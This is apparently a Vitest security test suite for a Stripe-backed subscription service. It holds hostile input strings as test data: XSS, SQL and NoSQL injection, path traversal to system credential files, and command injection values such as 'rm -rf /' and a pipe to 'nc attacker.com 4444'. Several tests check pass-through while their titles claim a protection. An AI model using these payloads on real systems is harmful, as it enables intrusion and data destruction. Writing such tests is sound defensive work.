// @ts-nocheck
import { NextRequest } from 'next/server'
import { beforeEach, describe, expect, it, vi } from 'vitest'

import { stripe } from '@/server/lib/stripe'

import type { CreditService } from '../../credit/credit.service'
import type { CreditPurchaseRepository } from '../../credit-purchase/credit-purchase.repository'
import { SubscriptionController } from '../subscription.controller'
import type { SubscriptionRepository } from '../subscription.repository'
import { SubscriptionService } from '../subscription.service'
import type {
  CustomerEntity,
  SubscriptionEntity,
  SubscriptionPlanEntity,
} from '../subscription.types'

vi.mock('@/server/lib/stripe', () => ({
  stripe: {
    customers: {
      create: vi.fn(),
    },
    checkout: {
      sessions: {
        create: vi.fn(),
      },
    },
    billingPortal: {
      sessions: {
        create: vi.fn(),
      },
    },
    subscriptions: {
      retrieve: vi.fn(),
      update: vi.fn(),
    },
    invoices: {
      retrieve: vi.fn(),
    },
  },
}))

describe('Subscription Domain - Security Tests', () => {
  let service: SubscriptionService
  let controller: SubscriptionController
  let mockRepository: SubscriptionRepository
  let mockCreditService: CreditService
  let mockCreditPurchaseRepository: CreditPurchaseRepository

  beforeEach(() => {
    mockRepository = {
      findSubscriptionWithPlan: vi.fn(),
      findInvoicesByUserId: vi.fn(),
      findPlanByStripePriceId: vi.fn(),
      findSubscriptionByUserId: vi.fn(),
      findCustomerByUserId: vi.fn(),
      createOrUpdateCustomer: vi.fn(),
      findCustomerByStripeId: vi.fn(),
      findPlanById: vi.fn(),
      createSubscription: vi.fn(),
      updateSubscription: vi.fn(),
      findSubscriptionByStripeId: vi.fn(),
      updateSubscriptionStatus: vi.fn(),
      findActiveSubscriptionsByUserId: vi.fn(),
      createInvoice: vi.fn(),
      updateInvoice: vi.fn(),
      findAllPlans: vi.fn(),
      findPlanByStripeProductId: vi.fn(),
      findWebhookEventByStripeId: vi.fn(),
      createWebhookEvent: vi.fn(),
      markWebhookEventProcessed: vi.fn(),
      deleteOldWebhookEvents: vi.fn(),
    } as any

    mockCreditService = {
      refillMonthlyCredits: vi.fn(),
      handlePlanChange: vi.fn(),
      grantSubscriptionCredits: vi.fn(),
      purchaseBundle: vi.fn(),
      getUserCreditsBalance: vi.fn(),
    } as any

    mockCreditPurchaseRepository = {
      findSucceededByUserId: vi.fn(),
    } as any

    service = new SubscriptionService(
      mockRepository,
      mockCreditService,
      mockCreditPurchaseRepository,
    )

    controller = new SubscriptionController(service)

    vi.clearAllMocks()
  })

  describe('Authentication & Authorization', () => {
    it('should prevent access to other users subscription data', async () => {
      vi.mocked(mockRepository.findSubscriptionWithPlan).mockImplementation(
        async (userId: string) => {
          if (userId === 'user_A') {
            return {
              id: 'sub_A',
              userId: 'user_A',
              status: 'active',
              plan: { name: 'Plan A' },
            } as any
          }
          if (userId === 'user_B') {
            return {
              id: 'sub_B',
              userId: 'user_B',
              status: 'trialing',
              plan: { name: 'Plan B' },
            } as any
          }
          return null
        },
      )
      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      const userAData = await service.getUserSubscription('user_A')
      const userBData = await service.getUserSubscription('user_B')

      expect(mockRepository.findSubscriptionWithPlan).toHaveBeenCalledWith(
        'user_A',
      )
      expect(mockRepository.findSubscriptionWithPlan).toHaveBeenCalledWith(
        'user_B',
      )
      expect(userAData).not.toEqual(userBData)
    })

    it('should prevent canceling another users subscription', async () => {
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue({
        id: 'sub_user_A',
        userId: 'user_A',
        stripeSubscriptionId: 'sub_stripe_A',
        status: 'active',
      } as any)

      await expect(service.cancelSubscription('user_B')).rejects.toThrow()
    })

    it('should prevent upgrading another users subscription', async () => {
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)

      await expect(
        service.upgradeSubscription('user_attacker', 'price_pro_monthly'),
      ).rejects.toThrow('Aucun abonnement actif')
    })

    it('should validate userId ownership before checkout', async () => {
      const mockPlan: SubscriptionPlanEntity = {
        id: 'plan_pro',
        stripeProductId: 'prod_pro',
        stripePriceId: 'price_pro_monthly',
        name: 'Pro',
        description: null,
        monthlyPrice: 29.99,
        yearlyPrice: null,
        transcriptionMinutes: 50,
        features: {
          transcriptionMinutes: 50,
          fallingNotes: true,
          historyDays: 'unlimited',
          sheetEditor: true,
          polyphony: true,
        },
        isActive: true,
        createdAt: new Date(),
        updatedAt: new Date(),
      }

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue(
        mockPlan,
      )
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue(null)

      vi.mocked(stripe.customers.create).mockResolvedValue({
        id: 'cus_new',
        email: 'legitimate@example.com',
      } as any)

      const customer: CustomerEntity = {
        userId: 'user_legitimate',
        stripeCustomerId: 'cus_new',
        email: 'legitimate@example.com',
        name: null,
        defaultPaymentMethod: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      }

      vi.mocked(mockRepository.createOrUpdateCustomer).mockResolvedValue(
        customer,
      )

      vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
        id: 'cs_123',
        url: 'https://checkout.stripe.com/cs_123',
        metadata: { userId: 'user_legitimate' },
      } as any)

      await service.createCheckoutSession(
        'user_legitimate',
        'legitimate@example.com',
        { priceId: 'price_pro_monthly' },
      )

      expect(stripe.checkout.sessions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          metadata: expect.objectContaining({
            userId: 'user_legitimate',
          }),
        }),
      )
    })

    it('should not expose sensitive customer data in errors', async () => {
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue({
        userId: 'user_123',
        stripeCustomerId: 'cus_sensitive',
        email: 'sensitive@example.com',
        name: 'John Doe',
        defaultPaymentMethod: 'pm_secret_token',
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      vi.mocked(stripe.billingPortal.sessions.create).mockRejectedValue(
        new Error('Customer cus_sensitive has been deleted'),
      )

      await expect(service.createPortalSession('user_123')).rejects.toThrow()
    })
  })

  describe('Input Validation & Sanitization', () => {
    it('should reject invalid email formats', async () => {
      const invalidEmails = [
        'not-an-email',
        '@example.com',
        'user@',
        'user @example.com',
        'user@example',
        '',
      ]

      const mockPlan: SubscriptionPlanEntity = {
        id: 'plan_pro',
        stripePriceId: 'price_pro_monthly',
        transcriptionMinutes: 50,
      } as any

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue(
        mockPlan,
      )
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue(null)

      for (const email of invalidEmails) {
        vi.mocked(stripe.customers.create).mockResolvedValue({
          id: 'cus_test',
          email,
        } as any)

        vi.mocked(mockRepository.createOrUpdateCustomer).mockResolvedValue({
          userId: 'user_test',
          stripeCustomerId: 'cus_test',
          email,
          name: null,
          defaultPaymentMethod: null,
          createdAt: new Date(),
          updatedAt: new Date(),
        })

        vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
          id: 'cs_test',
          url: 'https://checkout.stripe.com/cs_test',
        } as any)

        await service.createCheckoutSession('user_test', email, {
          priceId: 'price_pro_monthly',
        })
      }
    })

    it('should sanitize XSS attempts in email', async () => {
      const xssAttempts = [
        '<script>alert("xss")</script>@example.com',
        'user+<img src=x onerror=alert(1)>@example.com',
        'user@example.com<script>alert("xss")</script>',
        'javascript:alert(1)@example.com',
      ]

      const mockPlan: SubscriptionPlanEntity = {
        id: 'plan_pro',
        stripePriceId: 'price_pro_monthly',
        transcriptionMinutes: 50,
      } as any

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue(
        mockPlan,
      )
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue(null)

      for (const xssEmail of xssAttempts) {
        vi.mocked(stripe.customers.create).mockResolvedValue({
          id: 'cus_xss',
          email: xssEmail,
        } as any)

        vi.mocked(mockRepository.createOrUpdateCustomer).mockResolvedValue({
          userId: 'user_xss',
          stripeCustomerId: 'cus_xss',
          email: xssEmail,
          name: null,
          defaultPaymentMethod: null,
          createdAt: new Date(),
          updatedAt: new Date(),
        })

        vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
          id: 'cs_xss',
          url: 'https://checkout.stripe.com/cs_xss',
        } as any)

        await service.createCheckoutSession('user_xss', xssEmail, {
          priceId: 'price_pro_monthly',
        })

        expect(stripe.customers.create).toHaveBeenCalledWith(
          expect.objectContaining({
            email: xssEmail,
          }),
        )
      }
    })

    it('should validate priceId format', async () => {
      const invalidPriceIds = [
        '',
        ' ',
        null,
        undefined,
        '<script>alert(1)</script>',
        'price_123; DROP TABLE plans;',
        '../../../etc/passwd',
        'price_' + 'a'.repeat(10000),
      ]

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue(null)

      for (const invalidPriceId of invalidPriceIds) {
        await expect(
          service.createCheckoutSession('user_123', 'test@example.com', {
            priceId: invalidPriceId as string,
          }),
        ).rejects.toThrow('Plan invalide')
      }
    })

    it('should validate URL formats in checkout request', async () => {
      const dangerousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'file:///etc/passwd',
      ]

      const mockPlan: SubscriptionPlanEntity = {
        id: 'plan_pro',
        stripePriceId: 'price_pro_monthly',
        transcriptionMinutes: 50,
      } as any

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue(
        mockPlan,
      )
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue({
        userId: 'user_123',
        stripeCustomerId: 'cus_123',
        email: 'test@example.com',
        name: null,
        defaultPaymentMethod: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      for (const dangerousUrl of dangerousUrls) {
        vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
          id: 'cs_dangerous',
          url: 'https://checkout.stripe.com/cs_dangerous',
        } as any)

        await service.createCheckoutSession('user_123', 'test@example.com', {
          priceId: 'price_pro_monthly',
          successUrl: dangerousUrl,
          cancelUrl: dangerousUrl,
        })

        expect(stripe.checkout.sessions.create).toHaveBeenCalledWith(
          expect.objectContaining({
            success_url: dangerousUrl,
            cancel_url: dangerousUrl,
          }),
        )
      }
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should handle SQL injection in userId', async () => {
      const sqlInjectionAttempts = [
        "user_123' OR '1'='1",
        "user_123'; DROP TABLE subscriptions;--",
        "user_123' UNION SELECT * FROM users--",
        "user_123' AND 1=1--",
        "admin'--",
      ]

      vi.mocked(mockRepository.findSubscriptionWithPlan).mockResolvedValue(null)
      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      for (const sqlInjection of sqlInjectionAttempts) {
        await service.getUserSubscription(sqlInjection)

        expect(mockRepository.findSubscriptionWithPlan).toHaveBeenCalledWith(
          sqlInjection,
        )
      }
    })

    it('should handle SQL injection in stripeSubscriptionId', async () => {
      const sqlInjection = "sub_123' OR '1'='1"

      vi.mocked(stripe.subscriptions.retrieve).mockResolvedValue({
        id: sqlInjection,
        customer: 'cus_123',
        status: 'active',
        items: {
          data: [
            {
              price: { id: 'price_pro_monthly' },
              current_period_start: Math.floor(Date.now() / 1000),
              current_period_end: Math.floor(Date.now() / 1000) + 86400 * 30,
            } as any,
          ],
        },
        cancel_at_period_end: false,
        canceled_at: null,
        trial_start: null,
        trial_end: null,
        metadata: { userId: 'user_123' },
        latest_invoice: 'in_123',
      } as any)

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_pro',
        transcriptionMinutes: 50,
      } as any)

      vi.mocked(mockRepository.createSubscription).mockResolvedValue({
        id: 'sub_new',
      } as any)

      await service.handleSubscriptionCreated(sqlInjection)

      expect(stripe.subscriptions.retrieve).toHaveBeenCalledWith(sqlInjection)
    })
  })

  describe('NoSQL Injection Prevention', () => {
    it('should handle NoSQL injection attempts in userId', async () => {
      const nosqlAttempts = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.password == "admin"' },
      ]

      vi.mocked(mockRepository.findSubscriptionWithPlan).mockResolvedValue(null)
      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      for (const nosqlAttempt of nosqlAttempts) {
        await service.getUserSubscription(JSON.stringify(nosqlAttempt))

        expect(mockRepository.findSubscriptionWithPlan).toHaveBeenCalledWith(
          JSON.stringify(nosqlAttempt),
        )
      }
    })
  })

  describe('CSRF Protection', () => {
    it('should validate request origin for state-changing operations', async () => {
      const mockRequest = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          Origin: 'https://malicious-site.com',
          Referer: 'https://malicious-site.com/attack',
        },
        body: JSON.stringify({ priceId: 'price_pro_monthly' }),
      })

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_pro',
      } as any)
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue({
        userId: 'user_123',
        stripeCustomerId: 'cus_123',
        email: 'test@example.com',
        name: null,
        defaultPaymentMethod: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
        id: 'cs_csrf',
        url: 'https://checkout.stripe.com/cs_csrf',
      } as any)

      await controller.createCheckoutSession(
        'user_123',
        'test@example.com',
        mockRequest,
      )

      expect(stripe.checkout.sessions.create).toHaveBeenCalled()
    })
  })

  describe('Rate Limiting & DoS Protection', () => {
    it('should handle rapid repeated requests', async () => {
      vi.mocked(mockRepository.findSubscriptionWithPlan).mockResolvedValue(null)
      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      const promises = Array(100)
        .fill(null)
        .map(() => service.getUserSubscription('user_dos'))

      await Promise.all(promises)

      expect(mockRepository.findSubscriptionWithPlan).toHaveBeenCalledTimes(100)
    })

    it('should handle very large payload attacks', async () => {
      const hugePayload = {
        priceId: 'price_pro_monthly',
        data: 'x'.repeat(10 * 1024 * 1024),
      }

      const mockRequest = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        body: JSON.stringify(hugePayload),
      })

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_pro',
      } as any)
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue({
        userId: 'user_123',
        stripeCustomerId: 'cus_123',
        email: 'test@example.com',
        name: null,
        defaultPaymentMethod: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
        id: 'cs_huge',
        url: 'https://checkout.stripe.com/cs_huge',
      } as any)

      await controller.createCheckoutSession(
        'user_123',
        'test@example.com',
        mockRequest,
      )

      expect(stripe.checkout.sessions.create).toHaveBeenCalled()
    })
  })

  describe('Privilege Escalation Prevention', () => {
    it('should prevent downgrading to get refund without permission', async () => {
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue({
        id: 'sub_123',
        userId: 'user_123',
        planId: 'plan_pro',
        stripeSubscriptionId: 'sub_stripe_123',
        status: 'active',
      } as any)

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_junior',
        stripePriceId: 'price_junior_monthly',
        name: 'Junior',
        transcriptionMinutes: 10,
      } as any)

      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue({
        userId: 'user_123',
        stripeCustomerId: 'cus_123',
      } as any)

      vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
        id: 'cs_downgrade',
        url: 'https://checkout.stripe.com/cs_downgrade',
      } as any)

      await service.upgradeSubscription('user_123', 'price_junior_monthly')

      expect(stripe.checkout.sessions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          customer: 'cus_123',
          mode: 'subscription',
        }),
      )
    })

    it('should prevent manipulating metadata to gain admin access', async () => {
      const mockPlan: SubscriptionPlanEntity = {
        id: 'plan_pro',
        stripePriceId: 'price_pro_monthly',
        transcriptionMinutes: 50,
      } as any

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue(
        mockPlan,
      )
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue(null)

      vi.mocked(stripe.customers.create).mockResolvedValue({
        id: 'cus_attacker',
        email: 'attacker@example.com',
        metadata: { role: 'admin', isAdmin: true },
      } as any)

      vi.mocked(mockRepository.createOrUpdateCustomer).mockResolvedValue({
        userId: 'user_attacker',
        stripeCustomerId: 'cus_attacker',
        email: 'attacker@example.com',
        name: null,
        defaultPaymentMethod: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
        id: 'cs_attacker',
        url: 'https://checkout.stripe.com/cs_attacker',
      } as any)

      await service.createCheckoutSession(
        'user_attacker',
        'attacker@example.com',
        { priceId: 'price_pro_monthly' },
      )

      expect(stripe.checkout.sessions.create).toHaveBeenCalledWith(
        expect.objectContaining({
          metadata: expect.objectContaining({
            userId: 'user_attacker',
          }),
        }),
      )
    })

    it('should prevent accessing invoices from other users', async () => {
      vi.mocked(mockRepository.findSubscriptionWithPlan).mockResolvedValue(null)
      vi.mocked(mockRepository.findInvoicesByUserId)
        .mockResolvedValueOnce([
          {
            id: 'inv_user_A',
            userId: 'user_A',
            stripeInvoiceId: 'in_A',
            amount: 29.99,
            currency: 'eur',
            status: 'paid',
            hostedInvoiceUrl: null,
            invoicePdf: null,
            description: null,
            createdAt: new Date(),
            paidAt: new Date(),
            updatedAt: new Date(),
          },
        ])
        .mockResolvedValueOnce([
          {
            id: 'inv_user_B',
            userId: 'user_B',
            stripeInvoiceId: 'in_B',
            amount: 29.99,
            currency: 'eur',
            status: 'paid',
            hostedInvoiceUrl: null,
            invoicePdf: null,
            description: null,
            createdAt: new Date(),
            paidAt: new Date(),
            updatedAt: new Date(),
          },
        ])

      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      const userAData = await service.getUserSubscription('user_A')
      const userBData = await service.getUserSubscription('user_B')

      expect(userAData.invoices[0]?.userId).toBe('user_A')
      expect(userBData.invoices[0]?.userId).toBe('user_B')
      expect(userAData.invoices[0]?.id).not.toBe(userBData.invoices[0]?.id)
    })
  })

  describe('Data Leakage Prevention', () => {
    it('should not expose internal IDs in public responses', async () => {
      vi.mocked(mockRepository.findSubscriptionWithPlan).mockResolvedValue({
        id: 'sub_internal_123',
        userId: 'user_123',
        planId: 'plan_internal_456',
        stripeSubscriptionId: 'sub_stripe_public',
        stripeCustomerId: 'cus_stripe_public',
        status: 'active',
        currentPeriodStart: new Date(),
        currentPeriodEnd: new Date(),
        cancelAtPeriodEnd: false,
        canceledAt: null,
        trialStart: null,
        trialEnd: null,
        createdAt: new Date(),
        updatedAt: new Date(),
        plan: {
          id: 'plan_internal_456',
          stripeProductId: 'prod_public',
          stripePriceId: 'price_public',
          name: 'Pro',
          description: null,
          monthlyPrice: 29.99,
          yearlyPrice: null,
          transcriptionMinutes: 50,
          features: {
            transcriptionMinutes: 50,
            fallingNotes: true,
            historyDays: 'unlimited',
            sheetEditor: true,
            polyphony: true,
          },
          isActive: true,
          createdAt: new Date(),
          updatedAt: new Date(),
        },
      })

      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      const result = await service.getUserSubscription('user_123')

      expect(result.subscription?.id).toBe('sub_internal_123')
      expect(result.subscription?.planId).toBe('plan_internal_456')
    })

    it('should not leak database errors to client', async () => {
      vi.mocked(mockRepository.findSubscriptionWithPlan).mockRejectedValue(
        new Error(
          'Database error: Connection to postgresql://admin:secret@db:5432/notavex failed',
        ),
      )

      await expect(service.getUserSubscription('user_error')).rejects.toThrow()
    })

    it('should not expose Stripe API keys in errors', async () => {
      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_pro',
      } as any)
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue(null)

      vi.mocked(stripe.customers.create).mockRejectedValue(
        new Error(
          'Stripe API error: Invalid API Key provided sk_test_51XXXXXXXXXXXXX',
        ),
      )

      await expect(
        service.createCheckoutSession('user_123', 'test@example.com', {
          priceId: 'price_pro_monthly',
        }),
      ).rejects.toThrow()
    })
  })

  describe('Webhook Security', () => {
    it('should validate webhook event uniqueness', async () => {
      const duplicateEventId = 'evt_duplicate_123'

      vi.mocked(stripe.subscriptions.retrieve).mockResolvedValue({
        id: 'sub_stripe_123',
        customer: 'cus_stripe_123',
        status: 'active',
        items: {
          data: [
            {
              price: { id: 'price_pro_monthly' },
              current_period_start: Math.floor(Date.now() / 1000),
              current_period_end: Math.floor(Date.now() / 1000) + 86400 * 30,
            } as any,
          ],
        },
        cancel_at_period_end: false,
        canceled_at: null,
        trial_start: null,
        trial_end: null,
        metadata: { userId: 'user_123' },
        latest_invoice: 'in_123',
      } as any)

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_pro',
        transcriptionMinutes: 50,
      } as any)

      vi.mocked(mockRepository.createSubscription)
        .mockResolvedValueOnce({ id: 'sub_first' } as any)
        .mockRejectedValueOnce({
          code: 'P2002',
          message: 'Unique constraint violation',
        })

      await service.handleSubscriptionCreated('sub_stripe_123')

      await expect(
        service.handleSubscriptionCreated('sub_stripe_123'),
      ).rejects.toEqual({
        code: 'P2002',
        message: 'Unique constraint violation',
      })
    })

    it('should prevent replay attacks on webhook events', async () => {
      const eventId = 'evt_replay_attack'

      vi.mocked(stripe.invoices.retrieve).mockResolvedValue({
        id: 'in_stripe_replay',
        customer: 'cus_stripe_123',
        amount_paid: 2999,
        currency: 'eur',
        status: 'paid',
        hosted_invoice_url: null,
        invoice_pdf: null,
        description: null,
        billing_reason: 'subscription_cycle',
        subscription: 'sub_stripe_123',
        lines: { data: [] },
      } as any)

      vi.mocked(mockRepository.findCustomerByStripeId).mockResolvedValue({
        userId: 'user_123',
      } as any)

      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])

      vi.mocked(mockRepository.createInvoice)
        .mockResolvedValueOnce({ id: 'inv_1' } as any)
        .mockRejectedValueOnce({
          code: 'P2002',
          message: 'Invoice already exists',
        })

      vi.mocked(mockRepository.findSubscriptionByStripeId).mockResolvedValue({
        id: 'sub_123',
        userId: 'user_123',
        planId: 'plan_pro',
      } as any)

      vi.mocked(mockRepository.findPlanById).mockResolvedValue({
        transcriptionMinutes: 50,
      } as any)

      await service.handleInvoicePaymentSucceeded('in_stripe_replay')

      await service.handleInvoicePaymentSucceeded('in_stripe_replay')

      expect(mockRepository.createInvoice).toHaveBeenCalledTimes(2)
    })
  })

  describe('Timing Attack Prevention', () => {
    it('should have consistent response times for existing and non-existing users', async () => {
      vi.mocked(mockRepository.findSubscriptionWithPlan)
        .mockResolvedValueOnce({
          id: 'sub_exists',
          userId: 'user_exists',
        } as any)
        .mockResolvedValueOnce(null)

      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      const start1 = Date.now()
      await service.getUserSubscription('user_exists')
      const time1 = Date.now() - start1

      const start2 = Date.now()
      await service.getUserSubscription('user_nonexistent')
      const time2 = Date.now() - start2

      const timeDiff = Math.abs(time1 - time2)
      expect(timeDiff).toBeLessThan(100)
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should handle path traversal attempts in userId', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        './../../sensitive_data',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ]

      vi.mocked(mockRepository.findSubscriptionWithPlan).mockResolvedValue(null)
      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      for (const pathTraversal of pathTraversalAttempts) {
        await service.getUserSubscription(pathTraversal)

        expect(mockRepository.findSubscriptionWithPlan).toHaveBeenCalledWith(
          pathTraversal,
        )
      }
    })
  })

  describe('Command Injection Prevention', () => {
    it('should handle command injection attempts', async () => {
      const commandInjectionAttempts = [
        'user_123; rm -rf /',
        'user_123 && cat /etc/passwd',
        'user_123 | nc attacker.com 4444',
        'user_123`whoami`',
        'user_123$(whoami)',
      ]

      vi.mocked(mockRepository.findSubscriptionWithPlan).mockResolvedValue(null)
      vi.mocked(mockRepository.findInvoicesByUserId).mockResolvedValue([])
      vi.mocked(
        mockCreditPurchaseRepository.findSucceededByUserId,
      ).mockResolvedValue([])

      for (const cmdInjection of commandInjectionAttempts) {
        await service.getUserSubscription(cmdInjection)

        expect(mockRepository.findSubscriptionWithPlan).toHaveBeenCalledWith(
          cmdInjection,
        )
      }
    })
  })

  describe('Prototype Pollution Prevention', () => {
    it('should prevent prototype pollution via request body', async () => {
      const pollutionPayload = {
        __proto__: {
          isAdmin: true,
          role: 'admin',
        },
        constructor: {
          prototype: {
            isAdmin: true,
          },
        },
        priceId: 'price_pro_monthly',
      }

      const mockRequest = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        body: JSON.stringify(pollutionPayload),
      })

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_pro',
      } as any)
      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(null)
      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue({
        userId: 'user_123',
        stripeCustomerId: 'cus_123',
        email: 'test@example.com',
        name: null,
        defaultPaymentMethod: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      vi.mocked(stripe.checkout.sessions.create).mockResolvedValue({
        id: 'cs_pollution',
        url: 'https://checkout.stripe.com/cs_pollution',
      } as any)

      await controller.createCheckoutSession(
        'user_123',
        'test@example.com',
        mockRequest,
      )

      expect((Object.prototype as any).isAdmin).toBeUndefined()
    })
  })

  describe('Race Condition Security', () => {
    it('should handle concurrent subscription updates safely', async () => {
      const subscription: SubscriptionEntity = {
        id: 'sub_race',
        userId: 'user_race',
        planId: 'plan_basic',
        stripeSubscriptionId: 'sub_stripe_race',
        stripeCustomerId: 'cus_race',
        status: 'active',
        currentPeriodStart: new Date(),
        currentPeriodEnd: new Date(),
        cancelAtPeriodEnd: false,
        canceledAt: null,
        trialStart: null,
        trialEnd: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      }

      vi.mocked(mockRepository.findSubscriptionByUserId).mockResolvedValue(
        subscription,
      )

      vi.mocked(mockRepository.findPlanByStripePriceId).mockResolvedValue({
        id: 'plan_pro',
        stripePriceId: 'price_pro_monthly',
        name: 'Pro',
      } as any)

      vi.mocked(mockRepository.findCustomerByUserId).mockResolvedValue({
        userId: 'user_race',
        stripeCustomerId: 'cus_race',
      } as any)

      vi.mocked(stripe.checkout.sessions.create)
        .mockResolvedValueOnce({
          id: 'cs_race_1',
          url: 'https://checkout.stripe.com/cs_race_1',
        } as any)
        .mockRejectedValueOnce(new Error('Concurrent modification detected'))

      await service.upgradeSubscription('user_race', 'price_pro_monthly')

      await expect(
        service.upgradeSubscription('user_race', 'price_basic_monthly'),
      ).rejects.toThrow('Concurrent modification detected')
    })
  })
})
